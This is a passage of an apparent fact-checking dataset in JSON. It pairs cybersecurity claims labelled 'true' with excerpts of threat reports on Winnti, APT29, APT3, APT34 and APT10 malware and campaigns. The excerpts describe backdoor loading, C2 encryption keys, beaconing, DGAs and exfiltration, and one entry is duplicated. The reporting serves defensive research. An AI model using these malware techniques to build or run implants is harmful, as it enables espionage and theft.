of “big tech” companies Google and Facebook and the criminalization of bloggers, it describes the systemic online harassment and abuse of activists. Against this background, these attacks further undermine the ability of HRDs to exercise their rights to freedom of expression, opinion and peaceful assembly. Targeting people solely for peacefully exercising their human rights is unlawful. The Vietnamese government should conduct an independent and transparent investigation on these attacks and ensure that effective legal remedies are provided to people who complain of abuses of their human rights due to surveillance. Addressing unlawful targeted surveillance also requires changes from the Vietnamese authorities. You can find a full list of recommendations in the “Let Us Breathe” report from December 2020. Here is the list of emails identified in this investigation:\n\n\n",

        "claim": "The gaming industry in Asia has been targeted by attackers who compromise game developers to insert backdoors into games' build environments, leading to malware distribution disguised as legitimate software, highlighting a significant cybersecurity threat in the digital gaming sector.",
        "original_label": "true",
        "label": "true",
        "explain": "This is not the first time the gaming industry has been targeted by attackers who compromise game developers, insert backdoors into a game’s build environment, and then have their malware distributed as legitimate software. In April 2013, Kaspersky Lab reported that a popular game was altered to include a backdoor in 2011. That attack was attributed to perpetrators Kaspersky called the Winnti Group. Yet again, new supply-chain attacks recently caught the attention of ESET Researchers. This time, two games and one gaming platform application were compromised to include a backdoor. Given that these attacks were mostly targeted against Asia and the gaming industry, it shouldn’t be surprising they are the work of the group described in Kaspersky’s “Winnti – More than just a game”. Although the malware uses different configurations in each case, the three affected software products included the same backdoor code and were launched using the same mechanism. While two of the compromised products no longer include the backdoor, one of the affected developers is still distributing the trojanized version: ironically, the game is named Infestation, and is produced by Thai developer Electronics Extreme. We have tried informing them several times, through various channels, since early February, but without apparent success. Let’s look at how the malicious payload is embedded and then look into the details of the backdoor itself. The payload code is started very early during the execution of the backdoored executable file. Right after the PE entry point, the standard call to the C Runtime initialization (__scrt_common_main_seh in Figure 1) is hooked to launch the malicious payload before everything else (Figure 2). This may suggest that the malefactor changed a build configuration rather than the source code itself. The code added to the executable decrypts and launches the backdoor in-memory before resuming normal execution of the C Runtime initialization code and all the subsequent code of the host application. The embedded payload data has a specific structure, seen in Figure 3, that is parsed by the added unpacking code. It includes an RC4 key (which is XORed with 0x37) that is used to decrypt a filename and the embedded DLL file. The actual malicious payload is quite small and only contains about 17 KB of code and data. Illustrated in Figure 4, the configuration data is simply a whitespace-separated list of strings. The configuration consists of four fields: ESET researchers have identified five versions of the payload: In the first three variants, the code was not recompiled, but the configuration data was edited in the DLL file itself. The rest of the content is a byte for byte copy. Domain names were carefully chosen to look like they are related to the game or application publisher. The apex domain was set to redirect to a relevant legitimate site using the Namecheap redirection service, while the subdomain points to the malicious C&C server. A bot identifier is generated from the machine’s MAC address. The backdoor reports information about the machine such as the user name, computer name, Windows version and system language to the C&C server and awaits commands. The data is XOR encrypted with the key “*&b0i0rong2Y7un1” and base64-encoded. The data received from the C&C server is encrypted using the same key. This simple backdoor has only four commands that can be used by the attacker: The commands are pretty much self-explanatory. They allow the attacker to run additional executables from a given URL. The last one is perhaps less obvious. The UnInstall command doesn’t remove the malware from the system. After all, it is embedded inside a legitimate executable that still needs to run. Rather than removing anything, it disables the malicious code by setting the following registry value to 1: When the payload is started, the registry value is queried and execution is aborted if set. Perhaps the attackers are trying to reduce the load from their C&C servers by avoiding callbacks from uninteresting victims. Based on ESET telemetry, one of the second stage payload delivered to victims is Win64/Winnti.BN. As far as we can tell, its dropper was downloaded over HTTPS from api.goallbandungtravel[.]com. We have seen it installed as a Windows service and as a DLL in C:\\Windows\\System32 using the following file names: The samples we have analyzed were actually quite large, each of them about 60 MB. This is, however, only for appearance because the real size or the PE file is between 63 KB and 72 KB, depending on the version. The malware files simply have lots of clean files appended to them. This is probably done by the component that drops and installs this malicious service. Once the service runs, it appends the extension .mui to its DLL path, reads that file and decrypts it using RC5. The decrypted MUI file contains position-independent code at offset 0. The RC5 key is derived from the hard drive serial number and the string “f@Ukd!rCto R$.” — we were not able to obtain any MUI files nor the code that installs them in the first place. Thus, we do not know the exact purpose of this malicious service. Recent versions of the malware include an “auto-update” mechanism, using C&C server http://checkin.travelsanignacio[.]com. That C&C server served the latest version of the MUI files encrypted with a static RC5 key. The C&C server was not responding during our analysis. Let’s start with who is not targeted. Early in the payload, the malware checks to see if the system language is Russian or Chinese (Figure 5). In either case, the malware stops running. There is no way around this: the attackers are simply not interested in computers configured with those languages. ESET telemetry shows victims are mostly located in Asia, with Thailand having the largest part of the pie. Given the popularity of the compromised application that is still being distributed by its developer, it wouldn’t be surprising if the number of victims is in the tens or hundreds of thousands. Supply-chain attacks are hard to detect from the consumer perspective. It is impossible to start analyzing every piece of software we run, especially with all the regular updates we are encouraged or required to install. So, we put our trust in software vendors that the files they distribute don’t include malware. Perhaps that’s the reason multiple groups target software developers: compromising the vendor results in a botnet as popular as the software that is hacked. However, there is a downside of using such a technique: once the scheme is uncovered, the attacker loses control and computers can be cleaned through regular updates. We do not know the motives of the attackers at this point. Is it simply financial gain? Are there any reasons why the three affected products are from Asian developers and for the Asian market? Do these attackers use a botnet as part of a larger espionage operation? ESET products detect this threat as Win32/HackedApp.Winnti.A, Win32/HackedApp.Winnti.B, the payload as Win32/Winnti.AG, and the second stage as Win64/Winnti.BN.\n\n\n",

        "claim": "The analysis reveals a targeted and stealthy backdoor implant with a specific set of functions designed to give attackers a strong foothold within an infected system. The malware uses a variety of techniques to avoid detection and maintain communication with the attacker's infrastructure.",
        "original_label": "true",
        "label": "true",
        "explain": "Analysis reveals the implant is a multi-threaded DLL backdoor that gives the threat actor (TA) full access to, and control of, the target host. When commanded by C2, the implant can upload or download files, create processes, interact with the host via a command shell and connect to C2 according to a defined sleep/activity schedule.As covered in Part 1, the implant is written in C++ and statically linked against OpenSSL and the Poco C++ framework. Since the file is packaged as a DLL, the intention would be to inject it into a long-running process that is granted Internet access (such as a NetSvc service group) or one having local firewall permissions. We do not believe this DLL is intended to operate as a module for a larger tool.Malicious code entry occurs via the DllMain export. The implant’s first task is to load the legitimate Microsoft npmproxy.dll found in “c:\\windows\\system32”. With this loaded, the addresses of the five implant exports, “DllCanUnloadNow”, “DllGetClassObject”, “DllRegisterServer”, “DllUnregisterServer” and “GetProxyDllInfo” are set to the addresses of the same, benign exports found in the Microsoft DLL.The reason for this is unconfirmed, but most likely serves a defensive measure to evade end point protection that scans export addresses looking for code changes (when compared to a predetermined signature database), or against a database of known-malicious code. Perhaps by setting its own exports to those of the benign copy, the implant is attempting to remain undetected:With export addresses replaced, a thread is launched to execute the main code path. Within this, a second thread is launched responsible for send and receive operations with C2. A global variable forms the basis of inter-thread synchronization for processing of C2 messages.The primary thread’s first task is the creation of a Globally Unique ID (GUID) mutex “1b8232f6-6806-4733-901d-62bf3ef33e6c”. The GUID string can be found as plain text within the binary, offering a potential (albeit trivially replaceable) IoC. As is customary, if mutex creation fails the sample terminates with no further action taken.Following mutex creation, the implant generates a unique CRC-32 host fingerprint using the primary network interface’s ethernet (MAC) address, the host name, and Windows version string. The final CRC-32 result is then XOR’d with fixed constant 0x64113. The generated host fingerprint is used later to build the C2 beacon URL, and presumably identifies the implant’s malicious use on each infected machine.The main communication protocol with the C2 server is RSA encrypted, Base64 encoded JSON exchanged over HTTPS (TLS, port 443), or as fallback, on plain HTTP using port 80. During our analysis the implant did not attempt to use any other application protocols.The user-agent string for HTTP requests is populated from either the return value of the “﻿ObtainUserAgentString” API call, or if that fails, a hard-coded alternate (see IoCs below).Support for egress proxy servers is included through a call to“﻿WinHttpGetIEProxyConfigForCurrentUser”. The result is parsed and supplied to the Poco framework’s “﻿ HTTPClientSession::setProxyConfig” prior to C2 activity.A 1024-bit RSA key pair is embedded within the implant and used to encrypt and decrypt communication between host and C2. The private key decrypts inbound traffic while the public key encrypts outbound. No stream cipher(s) or session keys are negotiated.The initial HTTPS beacon to “malaytravelgroup[.]com” is a GET request consisting of a randomly selected URL path concatenation, together with a query string containing the parameter split count, the XOR constant 0x64113 (also used when generating the host CRC-32), and the computed CRC-32 fingerprint. The query string is padded with random data to prevent ad-hoc analysis and finally Base64 encoded:The URL path component is built as one to three strings (“/” separated), generated from a set of encrypted string tables. The decrypted versions are provided in the Appendix.The Base64 encoded data is split into a random number of parameters and padded as a means of obfuscation. The query parameter’s names are randomly generated using 1-4 upper/lower case characters:Using the first example in Figure 3, the first query parameter indicating the beacon data split count would be Base64 decoded as:All successive query parameters have the first two characters removed prior to Base64 decoding. The first byte of the decoded result is then discarded to arrive at the final value:Once the beacon is received and decoded, the next phase of interaction is to issue commands that drive the implant’s functions, such as the provision of an activity schedule/sleep interval limiting implant activity.The primary C2 domain of “malaytravelgroup[.]com” is used for the initial beacon. Like all sensitive strings, it is XOR encoded and revealed only when needed.The implant also contains a Linear Congruential Generator (LCG) based algorithm for generating what appear to be backup C2 domain names. Curiously the implementation is 100% deterministic owing to the use of a fixed seed value (0xC31) as shown in Figure 4. Every invocation of the DGA will produce the same five domains: Domain names are generated as the concatenation of 4 string-table lookups from 3 encrypted string tables. Table 3 is referenced twice during generation. The Top-Level Domain (TLD) suffix is hardcoded to “.com”.Assuming the continued adoption of a four-part domain name, the LCG would be capable of generating millions of unique permutations. The reason for limiting its output to the same five, irrespective of date, time, host identity, or other input variable is unclear. A copy of the decrypted string tables is provided in the Appendix.By manually decreasing the delay between check-in attempts, we accelerated the amount of C2 activity generated by the implant. Curiously, during a 24-hour observation window, no attempts were made to communicate with the generated domains. Different reachability scenarios were tested, ranging from malformed responses to unreachable IP addresses. At no point did the implant generate any DNS or HTTP traffic relating to the generated domains.It’s conceivable the backup domains are accessed via HTTP 302 redirects issued by the primary site, but this would seemingly defeat the purpose of having primary and backup domains to cater for failure, migration, or shutdown. It’s also possible the generated C2 domains are active only for certain implant commands such as file upload or download.Lacking any evidence for their direct use, we can speculate the generated domains may be operating as a honeypot. Access to them from any Internet addresses would immediately be considered “suspicious” by virtue of their hidden existence only within the implant code. The source of such requests could be directly attributable to threat researchers or analysts investigating the implant’s inner workings.The implant lacks any modularity and is therefore limited to eight functions. Each function is invoked from C2 by supplying a value from which a known CRC-32 is calculated. The computed CRC-32 value serves as a key or look-up to execute the corresponding function.The shell capability is perhaps the most interesting, giving the operators a full-duplex, interactive COMSPEC (cmd.exe) session, with stdin (input), stdout, and stderr (output returned by commands) redirected over the HTTPS C2 channel. Commands to the shell are issued by the TA with the resulting output being returned almost immediately.Despite the shell pipe creation taking place in (as identified by IDA signatures) the Poco framework’s “SMTPChannel” constructor, the implant makes no use of SMTP as a transport. The “bash” parameter, synonymous with Linux environments, hints at a multi-platform capability. However, in this instance it is used to send commands to the shell by writing the accompanying value to stdin. Windows 10 does offer a Linux Subsystem that would make a bash shell available, but we have no evidence to suggest this is what the operators are installing or using:Thirteen unique XOR keys are used throughout the implant for runtime decoding of sensitive strings. Each implant function (as listed in Table 4) is provided with its own XOR key, as are general C2, URL/HTTP, and RSA related operations:Analysis shows the implant carries a feature set designed to provide the fundamental capabilities of a backdoor: file download, upload, remote command execution, and interactive shell access.Comparing the functions of this implant to published descriptions of APT-28’s “x-tunnel”, we find no tunneling, proxying, or VPN-like capabilities. It also lacks credential harvesting, network service scanning, or Windows registry manipulation. Given the lack of modularity only an updated version could provide these features. The alternative (and perhaps more likely) scenario would be for such capabilities to exist in subsequent tools downloaded and executed by this implant.\n\n\n",

        "claim": "The gaming industry in Asia has been targeted by attackers who compromise game developers to insert backdoors into games' build environments, leading to malware distribution disguised as legitimate software, highlighting a significant cybersecurity threat in the digital gaming sector.",
        "original_label": "true",
        "label": "true",
        "explain": "This is not the first time the gaming industry has been targeted by attackers who compromise game developers, insert backdoors into a game’s build environment, and then have their malware distributed as legitimate software. In April 2013, Kaspersky Lab reported that a popular game was altered to include a backdoor in 2011. That attack was attributed to perpetrators Kaspersky called the Winnti Group. Yet again, new supply-chain attacks recently caught the attention of ESET Researchers. This time, two games and one gaming platform application were compromised to include a backdoor. Given that these attacks were mostly targeted against Asia and the gaming industry, it shouldn’t be surprising they are the work of the group described in Kaspersky’s “Winnti – More than just a game”. Although the malware uses different configurations in each case, the three affected software products included the same backdoor code and were launched using the same mechanism. While two of the compromised products no longer include the backdoor, one of the affected developers is still distributing the trojanized version: ironically, the game is named Infestation, and is produced by Thai developer Electronics Extreme. We have tried informing them several times, through various channels, since early February, but without apparent success. Let’s look at how the malicious payload is embedded and then look into the details of the backdoor itself. The payload code is started very early during the execution of the backdoored executable file. Right after the PE entry point, the standard call to the C Runtime initialization (__scrt_common_main_seh in Figure 1) is hooked to launch the malicious payload before everything else (Figure 2). This may suggest that the malefactor changed a build configuration rather than the source code itself. The code added to the executable decrypts and launches the backdoor in-memory before resuming normal execution of the C Runtime initialization code and all the subsequent code of the host application. The embedded payload data has a specific structure, seen in Figure 3, that is parsed by the added unpacking code. It includes an RC4 key (which is XORed with 0x37) that is used to decrypt a filename and the embedded DLL file. The actual malicious payload is quite small and only contains about 17 KB of code and data. Illustrated in Figure 4, the configuration data is simply a whitespace-separated list of strings. The configuration consists of four fields: ESET researchers have identified five versions of the payload: In the first three variants, the code was not recompiled, but the configuration data was edited in the DLL file itself. The rest of the content is a byte for byte copy. Domain names were carefully chosen to look like they are related to the game or application publisher. The apex domain was set to redirect to a relevant legitimate site using the Namecheap redirection service, while the subdomain points to the malicious C&C server. A bot identifier is generated from the machine’s MAC address. The backdoor reports information about the machine such as the user name, computer name, Windows version and system language to the C&C server and awaits commands. The data is XOR encrypted with the key “*&b0i0rong2Y7un1” and base64-encoded. The data received from the C&C server is encrypted using the same key. This simple backdoor has only four commands that can be used by the attacker: The commands are pretty much self-explanatory. They allow the attacker to run additional executables from a given URL. The last one is perhaps less obvious. The UnInstall command doesn’t remove the malware from the system. After all, it is embedded inside a legitimate executable that still needs to run. Rather than removing anything, it disables the malicious code by setting the following registry value to 1: When the payload is started, the registry value is queried and execution is aborted if set. Perhaps the attackers are trying to reduce the load from their C&C servers by avoiding callbacks from uninteresting victims. Based on ESET telemetry, one of the second stage payload delivered to victims is Win64/Winnti.BN. As far as we can tell, its dropper was downloaded over HTTPS from api.goallbandungtravel[.]com. We have seen it installed as a Windows service and as a DLL in C:\\Windows\\System32 using the following file names: The samples we have analyzed were actually quite large, each of them about 60 MB. This is, however, only for appearance because the real size or the PE file is between 63 KB and 72 KB, depending on the version. The malware files simply have lots of clean files appended to them. This is probably done by the component that drops and installs this malicious service. Once the service runs, it appends the extension .mui to its DLL path, reads that file and decrypts it using RC5. The decrypted MUI file contains position-independent code at offset 0. The RC5 key is derived from the hard drive serial number and the string “f@Ukd!rCto R$.” — we were not able to obtain any MUI files nor the code that installs them in the first place. Thus, we do not know the exact purpose of this malicious service. Recent versions of the malware include an “auto-update” mechanism, using C&C server http://checkin.travelsanignacio[.]com. That C&C server served the latest version of the MUI files encrypted with a static RC5 key. The C&C server was not responding during our analysis. Let’s start with who is not targeted. Early in the payload, the malware checks to see if the system language is Russian or Chinese (Figure 5). In either case, the malware stops running. There is no way around this: the attackers are simply not interested in computers configured with those languages. ESET telemetry shows victims are mostly located in Asia, with Thailand having the largest part of the pie. Given the popularity of the compromised application that is still being distributed by its developer, it wouldn’t be surprising if the number of victims is in the tens or hundreds of thousands. Supply-chain attacks are hard to detect from the consumer perspective. It is impossible to start analyzing every piece of software we run, especially with all the regular updates we are encouraged or required to install. So, we put our trust in software vendors that the files they distribute don’t include malware. Perhaps that’s the reason multiple groups target software developers: compromising the vendor results in a botnet as popular as the software that is hacked. However, there is a downside of using such a technique: once the scheme is uncovered, the attacker loses control and computers can be cleaned through regular updates. We do not know the motives of the attackers at this point. Is it simply financial gain? Are there any reasons why the three affected products are from Asian developers and for the Asian market? Do these attackers use a botnet as part of a larger espionage operation? ESET products detect this threat as Win32/HackedApp.Winnti.A, Win32/HackedApp.Winnti.B, the payload as Win32/Winnti.AG, and the second stage as Win64/Winnti.BN.\n\n\n",

        "explain": "Ukrainian security researchers have revealed a major new Russian cyber-espionage campaign which they claim may have been designed to harvest information on Azerbaijan’s military strategy.APT29 (aka Cozy Bear, Nobelium and many other monikers) was behind the attacks, according to a new report from the Ukrainian National Security and Defense Council (NDSC).It targeted embassies in Azerbaijan, Greece, Romania and Italy, as well as international institutions such as the World Bank, European Commission, Council of Europe, WHO, UN and others.“The geopolitical implications are profound. Among the several conceivable motives, one of the most apparent aims of the SVR might be to gather intelligence concerning Azerbaijan’s strategic activities, especially in the lead-up to the Azerbaijani invasion of Nagorno-Karabakh,” said the NDSC.“It’s noteworthy that the countries targeted – Azerbaijan, Greece, Romania, and Italy – maintain significant political and economic ties with Azerbaijan.”Read more on APT29: Diplomats in Ukraine Targeted by “Staggering” BMW Phishing CampaignThe campaign itself began as a spear-phishing email, using the lure of a diplomatic car for sale. The RAR attachment featured CVE-2023-3883, a bug which enables threat actors to insert malicious folders with the same name as benign files in a .zip archive.“In the course of the user’s effort to open the harmless file, the system unwittingly processes the concealed malicious content within the folder with a matching name, thus enabling the execution of arbitrary code,” the NDSC explained.In this attack, when a user clicks on the RAR archive contained in the phishing email it will execute a script to display a PDF of the car ‘for sale,’ whilst simultaneously downloading and executing a PowerShell script. The threat actors apparently use a Ngrok free static domain to access their malicious payload server hosted on a Ngrok instance.“By exploiting Ngrok’s capabilities in this manner, threat actors can further complicate cybersecurity efforts and remain under the radar, making defense and attribution more challenging,” noted the report.This isn’t the first time hackers have exploited CVE-2023-3883. It was observed being exploited by the Russian Sednit APT group (APT28) in August, shortly after Group-IB first notified about what was then a zero-day vulnerability.\n\n\n",

APT29, the threat group linked to the Russia’s Foreign Intelligence Service (SVR) and responsible for the SolarWinds supply chain hack, has ramped up the scope and frequency of its espionage attacks this year as the Kremlin sought more intel to assist Russia’s war on Ukraine. At the same time, APT29 has also increased its “more routine espionage operations” against diplomatic entities in other parts of the world, they said. It was the first time Mandiant had observed the threat group pursuing governments strategically aligned with Moscow, the researchers said. Mandiant said while the diplomatic and Microsoft campaigns are very different, there is evidence to suggest that once APT29’s initial access teams penetrated a victim’s environment, they handed off follow-on operations to a separate, centralized exploitation team responsible for data exfiltration. “Across these malware delivery operations, APT29 continues to prioritize European Ministries of Foreign Affairs and embassies, but it has also sustained operations that are global in scope and illustrative of Russia’s far-reaching ambitions and interests in other regions.”",

        "claim": "Chinese Group Built Advanced Trojan by Reverse Engineering NSA Attack Tool.",
        "original_label": "true",
        "label": "true",
        "explain": "Chinese threat actor APT3 quietly monitored the US National Security Agency's use of a highly sophisticated cyber attack tool and then reverse engineered the code to build an advanced Trojan of its own called Bemstour. That conclusion, by Check Point Software, is based on the security vendor's analysis of Bemstour after Symantec in May reported on APT3 using it in attacks on targets in multiple countries, including Belgium, Hong Kong and the Philippines. Symantec had described APT3 as using Bemstour to deliver a variant of a backdoor called DoublePulsar on target systems. Symantec said its analysis showed both tools appeared to be variants of attack software built by Equation Group, an operation affiliated with the NSA's Tailored Access Operations unit. Symantec said it was unclear how APT3 had obtained the NSA tools. But it ruled out the possibility that the Chinese threat actor had obtained the weapons from the large trove of NSA cyber weapons that hacking outfit Shadow Brokers publicly leaked in 2017. According to Symantec, its analysis showed that APT3 was using Bemstour and DoublePulsar well before the Shadow Brokers data dump. The two variants also had differences in code that made it very clear they did not originate from the leak, Symantec had noted. Check Point's analysis of Bemstour shows that the exploit is in fact APT3's own implementation of EternalRomance, a tool that the NSA developed to break into Windows 7, Windows 8, and some Windows NT systems, the security vendor said. APT3 developed the exploit by reverse-engineering EternalRomance, but then tweaked it so it could be used to target more systems. APT3's Bemstour leveraged the same Windows zero-day as the one used in EternalRomance (CVE-2017-0143). In addition the group also created an exploit for another Windows zero-day (CVE-2019-0703). Both flaws have been patched. “What we found out is that in terms of the software vulnerabilities targeted by the underlying exploit they were identical to those leveraged by EternalRomance,” says Mark Lechtik, lead security researcher at Check Point. “This is no coincidence - finding the exact same set of bugs in order to create an exploit that provides remote code execution capabilities is very unlikely,” he says. At the same time, there are enough differences in Bemstour to indicate the exploit was re-engineered and built from scratch, rather than copied wholesale. That is what led Check Point to conclude that an NSA exploit was used in some way as a reference, he notes. During the analysis of Bemstour, Check Point researchers found evidence suggesting the Chinese group had closely monitored systems under its control that the NSA had managed to compromise. APT3 members then captured traffic related to those attacks—including information on how the NSA was moving laterally on the compromised networks—and then used that as a reference to reverse-engineer the NSA's exploit. This allowed them to build an exploit tool that looked and worked remarkably similar to the NSA's exploit, but with less effort and cost. Instead of purchasing from a third party or investing in its own in-house team, APT3 built its malware by collecting and using the NSA's own attack data. “The main takeaway is that we see evidence for the first time of a nation-state collecting and reusing foreign attack tools to recreate their own,” Lechtik says. “We heard of that happening in theory; now we [have] facts that support it.” Lechtik says it's unclear if other Chinese APT groups and state actors have adopted a similar approach. But from their point of view, the approach would make sense. “If they can catch a tool and repurpose it, they cut the costs on finding it themselves,” he notes. “If we see they did it once, it would be likely they have done it on other instances and keep doing it today.” The question of whether other countries are doing the same thing is harder to answer, he says. Pulling off something like what APT3 did requires the ability to deliberately monitor domestic systems, collect and analyze a lot of information all with the hope of finding one usable tool. “Not all nation-states would go down this road in the first place, and indeed a lot don't use exploits, not to mention zero-days, almost at all,” he says. “Instead, they try to abuse human weaknesses through phishing, for example—an opportunistic but very cheap alternative. Iran and North Korea are examples for exactly that.\n\n\n",

Following the campaign, the group abused a fake license registration form of an African government agency to target a victim in Saudi Arabia.",
        "original_label": "true",
        "label": "true",
        "explain": "We analyzed a new malware, which we attribute to the APT34 advanced persistent threat (APT) group, that was involved in a phishing attack. In August, our threat hunting activities identified a malicious document we investigated to have been used during a targeted phishing attack by the group. The malicious document is responsible for dropping a new malware we have called Menorah (taken from the malicious document’s dropped executable, detected by Trend Micro as Trojan.W97M.SIDETWIST.AB), and for creating a scheduled task for persistence. The malware was designed for cyberespionage, capable of identifying the machine, reading and uploading files from the machine, and downloading another file or malware. During our investigation, there was little information about the victims targeted by this malware. But the file that APT34 used for this attack is called “MyCv.doc,” a license registration form related to the Seychelles Licensing Authority. However, we noted that the document contained pricing information in Saudi Riyal, which might indicate that the targeted victim was an organization inside the Kingdom of Saudi Arabia. This blog post provides an analysis of the group’s latest malware and its capabilities, shows the attack process, and details the attackers’ infrastructure. APT34 is a covert cyberespionage group that specializes in targeting organizations and illicit activities within the Middle East. As we’ve previously covered, APT34 primarily focuses on collecting sensitive intelligence, employing spear phishing campaigns, and abusing advanced techniques to infiltrate and maintain access within targeted networks. Our monitoring suggests this group operates with a high degree of sophistication and seemingly vast resources, posing a significant cybersecurity challenge regionally and beyond. Notably, APT34 has been involved in high-profile cyberattacks against a diverse range of targets in the Middle East, including government agencies, critical infrastructure, telecommunications, and key regional entities. The group consistently develops and enhances tools, aiming to reduce security solutions and researchers’ detection. In this research on APT34, we observed the group transitioning to the employment of novel data exfiltration methods. Researchers from NSFOCUS published a report on a new variant of the SideTwist malware utilized by APT34. The infection starts with a malicious document dropping a hardcoded malware and creates a scheduled task for persistence once the targeted victim opens the document. The malicious document contains hidden macros responsible for dropping a .NET malware into the <%ALLUSERSPROFILE%\\Office356> directory, naming it Menorah.exe. It then creates a scheduled task named “”OneDriveStandaloneUpdater” to execute the Menorah.exe malware. The image in Figure 2 shows a portion of the macros' functions responsible for string transformation, decoding, and the creation of the scheduled task. The .NET-written malware delivered through the malicious document is primarily deployed for cyberespionage and possesses multifaceted capabilities. The malware can fingerprint the targeted machine, list directories and files, upload selected files from the compromised system, execute shell commends, and download files to the system. Compared to the previous variant of SideTwist, the new variant has more functions to hash the traffic to the command and control (C&C) server and make it stealthier to avoid detection. Initially, the malware conducts a specific argument check during execution to ensure the correct flow of its operations. In the absence of the specified argument, the malware will terminate and stop its execution. The regular check ensures the routine’s and components’ stealth, and detects if the malware is in an analytic environment like a sandbox. If the argument determines that it’s running inside a sandbox, the malware will run without the argument and terminate itself. We identified the C&C server, http[:]//tecforsc-001-site1[.]gtempurl.com/ads.asp, as a string subsequently used for HTTP communication and to create a timer to repeat a specific code every 32,000 milliseconds (or every 32 seconds) as a way to organize communication with the C&C server. Then, the malware fingerprints the machine by getting the machine name and username in this format: {MachineNameUsername}. The malware continues to encode the string into ASCII then calculates for the MD5 hash from it. The MD5 hash is combined with the {MachineNameUsername} in the format {‘d@{MD5 hash}@MachineName|Username} XOR with a hardcoded string and encoded in Base64, creating a fingerprint for the compromised system. This fingerprint is sent to the C&C server as the content of an HTTP request, as shown in the figure below. Unfortunately, the C&C server was inactive at the time of analysis. However, from the analysis for functions responsible for parsing the C&C, we expected that the response returned will be an encrypted massage and further encoded in Base64. The decrypted and decoded message split into an array, and each value inside it represents part of the message received from the C&C server. Based on these values, the malware will have specific actions on the machine. From static analysis, we observed the malware capable of executing a command received from the C&C server, list directory and files on the compromised system, and upload specific files to server and download files. The following are the malware’s commands, values, and actions: In 2021, Checkpoint published an article about SideTwist malware written in native language. After comparing both malware variants, we found that there are significant similarities between the two in terms of functionality, especially in the way the malware fingerprints the compromised system and C&C communication. Moreover, SideTwist malware uses the computer name and username to create the unique ID for the victim machine, but the variant in 2021 uses a 4-byte hash instead of MD5 during the ID creation. Both malware variants provide similar backdoor functionalities to execute the shell command, as well as upload and download files. The similarities to the SideTwist backdoor suggests that APT34 is in continuous-development mode, changing up and trying which routines and techniques will work. Typical of APT groups, APT34 demonstrates their vast resources and varied skills, and will likely persist in customizing routines and social engineering techniques to use per targeted organization to ensure success in intrusions, stealth, and cyber espionage. The earlier variant of SideTwist is written in C, and this latest variant has a very similar set of functions but in a .NET implementation. While the techniques and malware infection routine in this sample are not on the same level of sophistication as the previously documented attacks of the group, the techniques still work as they continue to redo and depend on them. As previous reports on APT34 have noted, the group uses simple routines and changes that, for security analysts and researchers, don’t take long to track and analyze. But the group’s arsenal and skills enable them to rapidly create new pieces of malware and tools, allowing the group to continuously deploy in successive cycles. Organizations should continuously warn and keep their employees aware of the different techniques that attackers employ to target systems, proprietary, and personal information.\n\n\n",

        "claim": "A sustained cyberespionage campaign targeting at least three companies in the United States and Europe was uncovered by Recorded Future and Rapid7 between November 2017 and September 2018.",
        "original_label": "true",
        "label": "true",
        "explain": "Recorded Future analyzed an intrusion into one of our client’s networks and collaborated with Rapid7 to determine the scope of a cyberespionage campaign assessed to be conducted by a Chinese state-sponsored threat actor, APT10. This report details the campaign using data acquired from targeted host networks, the Recorded FutureⓇ Platform, network metadata, VirusTotal, Farsight DNS, Shodan, and other OSINT techniques. Norwegian company Visma, who was targeted in the attack, and U.S. company Rapid7 provided support and extensive expertise throughout this research. Industry collaboration is a vital enabler in illuminating threats and offering protection to organizations at risk from hostile, state-sponsored economic cyberespionage.This report will be of most value to network defenders and corporate risk executives within companies that utilize services from managed IT service providers and cloud hosting providers. The report will also be of interest to companies with an exposed third-party supply chain. A sustained cyberespionage campaign targeting at least three companies in the United States and Europe was uncovered by Recorded Future and Rapid7 between November 2017 and September 2018. Based on the technical data uncovered, and in light of recent disclosures by the U.S. Department of Justice on the ongoing activities of Chinese state-sponsored threat actors, we assess with high confidence that these incidents were conducted by APT10 (also known as Stone Panda, menuPass, CVNX) in an effort to gain access to networks and steal valuable intellectual property or gain commercial advantage. The targeted companies included:In all three incidents, the attackers gained access to networks through deployments of Citrix and LogMeIn remote-access software using stolen valid user credentials. The attackers then enumerated access and conducted privilege escalation on the victim networks, utilizing DLL sideloading techniques documented in a US-CERT alert on APT10 to deliver malware. During the Visma intrusion, APT10 deployed their Trochilus malware with command and control (C2) communications encrypted using both RC4 and Salsa20 streaming ciphers rather than the typically observed RC4 variant. On the two other victim networks, the attackers deployed a unique version of the UPPERCUT (ANEL) backdoor, known to have only been used by APT10. APT10 actors then compressed proprietary data from Visma using WinRAR (deployed by the attackers) and exfiltrated to a Dropbox account using the cURL for Windows command-line tool. The same Dropbox account was also accessed in a similar fashion by the attackers during the apparel company intrusion. Dropbox was also used to store exfiltrated documents from the third victim, a U.S. law firm, with the files again exfiltrated using identical TTPs and uploaded using cURL for Windows. We believe APT10 is the most significant Chinese state-sponsored cyber threat to global corporations known to date. On top of the breadth, volume, and targets of attacks that APT10 has conducted since at least 2016, we now know that these operations are being run by the Chinese intelligence agency, the Ministry of State Security (MSS). Utilizing actors working for shell companies such as Huaying Haitai Science and Technology Development Co Ltd (天津华盈海泰科技发展有限公司), and under the direct supervision of their regional bureau in Tianjin, the MSS has conducted an unprecedented campaign, dubbed “Operation Cloud Hopper,” against managed IT service providers (MSPs) designed to steal intellectual property and enable secondary attacks against their clients. Access to the networks of these third-party service providers grants the MSS the ability to potentially access the networks of hundreds, if not thousands, of corporations around the world. We assess that APT10 likely compromised Visma with the primary goal of enabling secondary intrusions onto their client networks, and not of stealing Visma intellectual property. In this same time frame, APT10 also targeted a U.S. law firm and an international apparel company, likely to gather information for commercial advantage. In all three incidents, APT10 actors used previously acquired legitimate credentials, possibly gained via a third-party supply chain compromise in order to gain initial access to the law firm and the apparel company.APT10 is a threat actor that has been active since at least 2009. It has historically targeted healthcare, defense, aerospace, government, heavy industry and mining, and MSPs and IT services, as well as other sectors, for probable intellectual property theft. In early 2017, APT10 began conducting attacks against global managed IT service providers (MSPs) that granted them unprecedented access to MSPs and their customers’ networks. During this operation (dubbed “‘Cloud Hopper” because of the group’s use of popular western cloud-based services), APT10 utilized both new malware (Quasar RAT, Trochilus, RedLeaves, ChChes) as well as some familiar old tools (Poison Ivy, PlugX). Most recently, on December 20, 2018, the U.S. Department of Justice charged two hackers associated with the Chinese Ministry of State Security (MSS) with global computer intrusion campaigns targeting intellectual property. This indictment attributed the intrusions to APT10, a group that had been conducting the malicious activities for over a decade on behalf of the MSS, China’s civilian human intelligence agency. Some of the material included within the indictment corroborated information detailed in the Intrusion Truth blog that provided strong evidence attributing APT10 to the Tianjin State Security Bureau, a provincial bureau of the Ministry of State Security. In the blog, Intrusion Truth identified APT10 as having utilized several Tianjin-based companies, including Huaying Haitai Science and Technology Development Co. Ltd. and Laoying Baichen Instruments Equipment Co. Ltd.The use of suspected 